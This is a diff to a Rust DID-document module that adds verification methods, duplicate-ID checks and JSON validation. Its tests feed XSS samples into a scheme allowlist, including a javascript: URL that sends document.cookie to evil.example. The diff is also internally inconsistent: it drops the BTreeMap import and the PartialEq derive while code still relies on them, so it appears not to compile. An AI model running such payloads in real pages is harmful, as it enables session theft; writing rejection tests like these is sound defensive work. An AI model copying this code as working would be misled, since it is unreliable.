@@ -45,8 +45,13 @@
 //! ```
 
 use serde::{Deserialize, Serialize};
-use std::collections::{BTreeMap, HashMap, HashSet};
+use std::collections::{HashMap, HashSet};
 use thiserror::Error;
+
+use crate::verification::{
+    canonical_verification_method_id, ensure_unique_verification_methods,
+    validate_verification_method, VerificationMethod,
+};
 
 // ── Errors ───────────────────────────────────────────────────────────────────
 
@@ -82,25 +87,29 @@ pub enum DidError {
     #[error("service type must not be empty")]
     EmptyServiceType,
 
-    /// The DID string does not conform to W3C DID Core syntax.
-    #[error("invalid DID `{input}`: {reason}")]
-    InvalidDid { input: String, reason: String },
+    /// A DID document already contains a verification method with this ID.
+    #[error("verification method `{0}` is already registered in this DID document")]
+    DuplicateVerificationMethodId(String),
 
-    /// The resolved document's `id` does not match the requested DID.
-    #[error("resolved DID document id `{actual}` does not match requested DID `{expected}`")]
-    DidMismatch { expected: String, actual: String },
+    /// The verification method ID is empty or blank.
+    #[error("verification method id must not be empty")]
+    EmptyVerificationMethodId,
 
-    /// The DID document JSON could not be parsed or is not a JSON object.
-    #[error("invalid DID document JSON: {reason}")]
-    InvalidDocumentJson { reason: String },
+    /// The verification method ID is syntactically invalid.
+    #[error("invalid verification method id `{id}`: {reason}")]
+    InvalidVerificationMethodId { id: String, reason: String },
 
-    /// Attempted to store a reserved top-level field in `additional_properties`.
-    #[error("property `{0}` is a reserved DID document field and cannot be set as an additional property")]
-    ReservedProperty(String),
+    /// The verification method type is empty or blank.
+    #[error("verification method type must not be empty")]
+    EmptyVerificationMethodType,
 
-    /// Attempted to set an additional property with an empty or blank key.
-    #[error("additional property key must not be empty")]
-    EmptyPropertyKey,
+    /// The verification method controller is empty or blank.
+    #[error("verification method controller must not be empty")]
+    EmptyVerificationMethodController,
+
+    /// A DID document failed structural or semantic validation.
+    #[error("invalid DID document: {reason}")]
+    InvalidDocument { reason: String },
 }
 
 // ── Scheme allowlist ─────────────────────────────────────────────────────────
@@ -278,27 +287,22 @@ impl Service {
 
 // ── DidDocument ───────────────────────────────────────────────────────────────
 
-/// Top-level fields owned directly by [`DidDocument`] that must not be
-/// duplicated in `additional_properties`.
-const RESERVED_DOCUMENT_FIELDS: &[&str] = &["id", "service"];
-
-/// A DID document that holds the subject identifier, service array, and any
-/// unknown/extension properties.
+/// A DID document holding verification methods and service endpoints.
 ///
-/// The service array is the publication surface for which scheme validation
-/// matters: `add_service` re-validates on every insertion as defense-in-depth,
-/// and it enforces uniqueness of service IDs so that a repeated ID cannot be
-/// used to shadow a legitimate entry.
-///
-/// Any unknown top-level JSON properties (such as `@context`, `alsoKnownAs`,
-/// `controller`, `verificationMethod`, `authentication`, or custom extension
-/// fields) are preserved in `additional_properties` across deserialization and
-/// re-serialization. Because `additional_properties` uses a [`BTreeMap`],
-/// serialized output has deterministic key ordering.
-#[derive(Debug, Clone, Default, PartialEq, Eq, Serialize, Deserialize)]
+/// Both `verification_method` and `service` enforce unique identifiers on
+/// mutation and during [`DidDocument::validate`] / [`DidDocument::from_json`]
+/// so that a repeated identifier cannot silently shadow a legitimate entry.
+#[derive(Debug, Clone, Default, Serialize, Deserialize)]
 pub struct DidDocument {
     /// DID subject identifier.
     pub id: String,
+    /// Verification methods registered in this document.
+    #[serde(
+        default,
+        rename = "verificationMethod",
+        skip_serializing_if = "Vec::is_empty"
+    )]
+    pub verification_method: Vec<VerificationMethod>,
     /// Service endpoints registered in this document.
     #[serde(default)]
     pub service: Vec<Service>,
@@ -314,6 +318,7 @@ impl DidDocument {
     pub fn new(id: impl Into<String>) -> Self {
         Self {
             id: id.into(),
+            verification_method: Vec::new(),
             service: Vec::new(),
             additional_properties: BTreeMap::new(),
         }
@@ -422,6 +427,124 @@ impl DidDocument {
         self.additional_properties.remove(key)
     }
 
+    /// Add a verification method to the document, rejecting duplicates.
+    ///
+    /// Both exact identifier matches and relative-vs-absolute collisions
+    /// (e.g. `#key-1` vs `<doc.id>#key-1`) are rejected. On error, the
+    /// document is left unchanged.
+    ///
+    /// # Errors
+    ///
+    /// * [`DidError::EmptyVerificationMethodId`],
+    ///   [`DidError::InvalidVerificationMethodId`],
+    ///   [`DidError::EmptyVerificationMethodType`], or
+    ///   [`DidError::EmptyVerificationMethodController`] — the method has
+    ///   missing or malformed required fields.
+    /// * [`DidError::DuplicateVerificationMethodId`] — a verification method
+    ///   with the same canonical identifier is already registered.
+    pub fn add_verification_method(
+        &mut self,
+        method: VerificationMethod,
+    ) -> Result<(), DidError> {
+        validate_verification_method(&method)?;
+
+        let candidate = canonical_verification_method_id(&self.id, &method.id);
+        if self
+            .verification_method
+            .iter()
+            .any(|existing| canonical_verification_method_id(&self.id, &existing.id) == candidate)
+        {
+            return Err(DidError::DuplicateVerificationMethodId(method.id));
+        }
+
+        self.verification_method.push(method);
+        Ok(())
+    }
+
+    /// Remove a verification method by its ID (exact or relative), returning
+    /// `true` when one was removed.
+    pub fn remove_verification_method(&mut self, id: &str) -> bool {
+        let target = canonical_verification_method_id(&self.id, id).into_owned();
+        let before = self.verification_method.len();
+        self.verification_method
+            .retain(|m| canonical_verification_method_id(&self.id, &m.id) != target);
+        self.verification_method.len() < before
+    }
+
+    /// Look up a verification method by its ID (exact or relative).
+    #[must_use]
+    pub fn get_verification_method(&self, id: &str) -> Option<&VerificationMethod> {
+        let target = canonical_verification_method_id(&self.id, id);
+        self.verification_method
+            .iter()
+            .find(|m| canonical_verification_method_id(&self.id, &m.id) == target)
+    }
+
+    /// Validate all document invariants, including unique verification-method
+    /// identifiers and valid, unique service endpoints.
+    ///
+    /// # Errors
+    ///
+    /// Returns [`DidError::InvalidDocument`] if `id` is blank, or the relevant
+    /// [`DidError`] variant for any invalid or duplicate verification method or
+    /// service.
+    pub fn validate(&self) -> Result<(), DidError> {
+        if self.id.trim().is_empty() {
+            return Err(DidError::InvalidDocument {
+                reason: "document id must not be empty".to_string(),
+            });
+        }
+
+        ensure_unique_verification_methods(&self.id, &self.verification_method)?;
+
+        let mut seen_services = HashSet::with_capacity(self.service.len());
+        for svc in &self.service {
+            if svc.id.trim().is_empty() {
+                return Err(DidError::EmptyServiceId);
+            }
+            if svc.service_type.trim().is_empty() {
+                return Err(DidError::EmptyServiceType);
+            }
+            let parsed = url::Url::parse(svc.service_endpoint.as_str()).map_err(|e| {
+                DidError::InvalidUri {
+                    input: svc.service_endpoint.as_str().to_string(),
+                    reason: e.to_string(),
+                }
+            })?;
+            let scheme = parsed.scheme();
+            if !is_scheme_allowed(scheme) {
+                return Err(DidError::InvalidScheme {
+                    scheme: scheme.to_string(),
+                    uri: svc.service_endpoint.as_str().to_string(),
+                });
+            }
+            if !seen_services.insert(svc.id.as_str()) {
+                return Err(DidError::DuplicateServiceId(svc.id.clone()));
+            }
+        }
+
+        Ok(())
+    }
+
+    /// Deserialize a [`DidDocument`] from JSON and validate its invariants.
+    ///
+    /// Unlike raw `serde_json::from_str`, this rejects documents containing
+    /// duplicate verification-method identifiers, duplicate service IDs, or
+    /// disallowed service endpoint schemes.
+    ///
+    /// # Errors
+    ///
+    /// Returns [`DidError::InvalidDocument`] on malformed JSON or any
+    /// validation error from [`DidDocument::validate`].
+    pub fn from_json(json: &str) -> Result<Self, DidError> {
+        let doc: Self =
+            serde_json::from_str(json).map_err(|e| DidError::InvalidDocument {
+                reason: e.to_string(),
+            })?;
+        doc.validate()?;
+        Ok(doc)
+    }
+
     /// Add a service to the document, validating the endpoint scheme.
     ///
     /// This is the **pre-publication gate**: a service cannot be added (and
@@ -494,7 +617,7 @@ mod tests {
     fn did_scheme_is_accepted() {
         // A DID URL is a valid service endpoint per DID Core.
         let ep = ServiceEndpoint::uri("did:stellar:testnet:GABC#linked-domain");
-        assert!(ep.is_ok(), "did: scheme must be accepted, got: {:?}", ep);
+        assert!(ep.is_ok(), "did: scheme must be accepted, got: {ep:?}");
     }
 
     #[test]
@@ -515,8 +638,7 @@ mod tests {
 
     #[test]
     fn data_scheme_is_rejected() {
-        let err =
-            ServiceEndpoint::uri("data:text/html,<script>alert(1)</script>").unwrap_err();
+        let err = ServiceEndpoint::uri("data:text/html,<script>alert(1)</script>").unwrap_err();
         assert!(
             matches!(err, DidError::InvalidScheme { ref scheme, .. } if scheme == "data"),
             "unexpected error: {err:?}"
@@ -632,10 +754,8 @@ mod tests {
         // defence-in-depth path we are testing here).
         let bad_ep = ServiceEndpoint(
             // Private field — craft via json round-trip
-            serde_json::from_value::<ServiceEndpoint>(serde_json::json!(
-                "javascript:alert(1)"
-            ))
-            .expect("deserialize"),
+            serde_json::from_value::<String>(serde_json::json!("javascript:alert(1)"))
+                .expect("deserialize"),
         );
         let svc = Service {
             id: "did:stellar:testnet:GABC#bad".to_string(),
@@ -707,8 +827,14 @@ mod tests {
 
         let value: serde_json::Value = serde_json::to_value(&doc).unwrap();
         assert_eq!(value["id"].as_str(), Some("did:stellar:testnet:GABC"));
-        assert_eq!(value["service"][0]["service_endpoint"].as_str(), Some("https://hub.example.com"));
-        assert_eq!(value["service"][0]["service_type"].as_str(), Some("LinkedDomains"));
+        assert_eq!(
+            value["service"][0]["service_endpoint"].as_str(),
+            Some("https://hub.example.com")
+        );
+        assert_eq!(
+            value["service"][0]["service_type"].as_str(),
+            Some("LinkedDomains")
+        );
     }
 
     // ── Integration: full document publication workflow ───────────────────────
@@ -742,98 +868,102 @@ mod tests {
     fn full_publication_workflow_rejects_dangerous_endpoint_before_publication() {
         // A document that attempts to add a dangerous endpoint must fail
         // before the service is committed to the document.
-        let mut document = DidDocument::new("did:stellar:testnet:GABC");
+        let document = DidDocument::new("did:stellar:testnet:GABC");
 
         // This endpoint would be dangerous in a browser-rendered resolver UI.
-        let err = ServiceEndpoint::uri("javascript:void(document.location='http://evil.example/steal?c='+document.cookie)").unwrap_err();
+        let err = ServiceEndpoint::uri(
+            "javascript:void(document.location='http://evil.example/steal?c='+document.cookie)",
+        )
+        .unwrap_err();
         assert!(matches!(err, DidError::InvalidScheme { .. }));
 
         // The document was never modified.
         assert!(document.service.is_empty());
     }
 
-    // ── Unknown property preservation & validation ────────────────────────────
+    // ── DidDocument::add_verification_method ─────────────────────────────────
 
-    #[test]
-    fn from_json_preserves_unknown_properties_and_round_trips() {
-        let json = r#"{
-            "@context": ["https://www.w3.org/ns/did/v1"],
-            "id": "did:stellar:testnet:GABC",
-            "alsoKnownAs": ["https://example.org"],
-            "customMeta": { "tier": 1, "active": true },
-            "service": []
-        }"#;
-
-        let doc = DidDocument::from_json(json).unwrap();
-        assert_eq!(doc.id, "did:stellar:testnet:GABC");
-        assert_eq!(
-            doc.get_property("@context"),
-            Some(&serde_json::json!(["https://www.w3.org/ns/did/v1"]))
-        );
-        assert_eq!(
-            doc.get_property("customMeta"),
-            Some(&serde_json::json!({ "tier": 1, "active": true }))
-        );
-
-        let serialized = doc.to_json().unwrap();
-        let reparsed = DidDocument::from_json(&serialized).unwrap();
-        assert_eq!(doc, reparsed);
+    fn make_vm(id: &str) -> VerificationMethod {
+        VerificationMethod::new(id, "Ed25519VerificationKey2020", "did:stellar:testnet:GABC")
+            .expect("valid verification method in test helper")
     }
 
     #[test]
-    fn set_and_remove_property_manage_additional_properties() {
+    fn add_verification_method_accepts_distinct_ids() {
         let mut doc = DidDocument::new("did:stellar:testnet:GABC");
-        doc.set_property("controller", serde_json::json!("did:stellar:testnet:GCTRL"))
+        doc.add_verification_method(make_vm("did:stellar:testnet:GABC#key-1"))
             .unwrap();
-        assert_eq!(
-            doc.get_property("controller"),
-            Some(&serde_json::json!("did:stellar:testnet:GCTRL"))
-        );
-
-        let removed = doc.remove_property("controller");
-        assert_eq!(
-            removed,
-            Some(serde_json::json!("did:stellar:testnet:GCTRL"))
-        );
-        assert!(doc.get_property("controller").is_none());
+        doc.add_verification_method(make_vm("#key-2")).unwrap();
+        assert_eq!(doc.verification_method.len(), 2);
+        assert!(doc.get_verification_method("#key-1").is_some());
+        assert!(doc
+            .get_verification_method("did:stellar:testnet:GABC#key-2")
+            .is_some());
     }
 
     #[test]
-    fn set_property_rejects_reserved_and_blank_keys() {
+    fn add_verification_method_rejects_exact_duplicate_without_mutation() {
         let mut doc = DidDocument::new("did:stellar:testnet:GABC");
+        doc.add_verification_method(make_vm("did:stellar:testnet:GABC#key-1"))
+            .unwrap();
 
-        assert!(matches!(
-            doc.set_property("id", serde_json::json!("did:stellar:testnet:OTHER")),
-            Err(DidError::ReservedProperty(ref k)) if k == "id"
-        ));
-        assert!(matches!(
-            doc.set_property("service", serde_json::json!([])),
-            Err(DidError::ReservedProperty(ref k)) if k == "service"
-        ));
-        assert!(matches!(
-            doc.set_property("   ", serde_json::json!(1)),
-            Err(DidError::EmptyPropertyKey)
-        ));
-        assert!(doc.additional_properties.is_empty());
+        let dup = VerificationMethod::new(
+            "did:stellar:testnet:GABC#key-1",
+            "JsonWebKey2020",
+            "did:stellar:testnet:GOTHER",
+        )
+        .unwrap();
+        let err = doc.add_verification_method(dup).unwrap_err();
+        assert!(matches!(err, DidError::DuplicateVerificationMethodId(_)));
+        assert_eq!(doc.verification_method.len(), 1);
+        assert_eq!(
+            doc.verification_method[0].method_type,
+            "Ed25519VerificationKey2020"
+        );
     }
 
     #[test]
-    fn from_json_rejects_invalid_did_and_malformed_json() {
-        assert!(matches!(
-            DidDocument::from_json("not json"),
-            Err(DidError::InvalidDocumentJson { .. })
-        ));
-        assert!(matches!(
-            DidDocument::from_json(r#"{"id": ""}"#),
-            Err(DidError::InvalidDid { .. })
-        ));
-        assert!(matches!(
-            DidDocument::from_json(r#"{"id": "did:INVALID:123"}"#),
-            Err(DidError::InvalidDid { .. })
-        ));
-        assert!(matches!(
-            DidDocument::from_json(r#"{"id": "did:stellar:"}"#),
-            Err(DidError::InvalidDid { .. })
-        ));
+    fn add_verification_method_rejects_relative_and_absolute_duplicate() {
+        let mut doc = DidDocument::new("did:stellar:testnet:GABC");
+        doc.add_verification_method(make_vm("#key-1")).unwrap();
+
+        let err = doc
+            .add_verification_method(make_vm("did:stellar:testnet:GABC#key-1"))
+            .unwrap_err();
+        assert!(matches!(err, DidError::DuplicateVerificationMethodId(_)));
+        assert_eq!(doc.verification_method.len(), 1);
+    }
+
+    #[test]
+    fn remove_verification_method_allows_re_adding_id() {
+        let mut doc = DidDocument::new("did:stellar:testnet:GABC");
+        doc.add_verification_method(make_vm("did:stellar:testnet:GABC#key-1"))
+            .unwrap();
+        assert!(doc.remove_verification_method("#key-1"));
+        assert!(doc.verification_method.is_empty());
+        doc.add_verification_method(make_vm("did:stellar:testnet:GABC#key-1"))
+            .unwrap();
+        assert_eq!(doc.verification_method.len(), 1);
+    }
+
+    #[test]
+    fn from_json_rejects_duplicate_verification_method_ids() {
+        let raw = r#"{
+            "id": "did:stellar:testnet:GABC",
+            "verificationMethod": [
+                {
+                    "id": "did:stellar:testnet:GABC#key-1",
+                    "type": "Ed25519VerificationKey2020",
+                    "controller": "did:stellar:testnet:GABC"
+                },
+                {
+                    "id": "#key-1",
+                    "type": "Ed25519VerificationKey2020",
+                    "controller": "did:stellar:testnet:GABC"
+                }
+            ]
+        }"#;
+        let err = DidDocument::from_json(raw).unwrap_err();
+        assert!(matches!(err, DidError::DuplicateVerificationMethodId(_)));
     }
 }
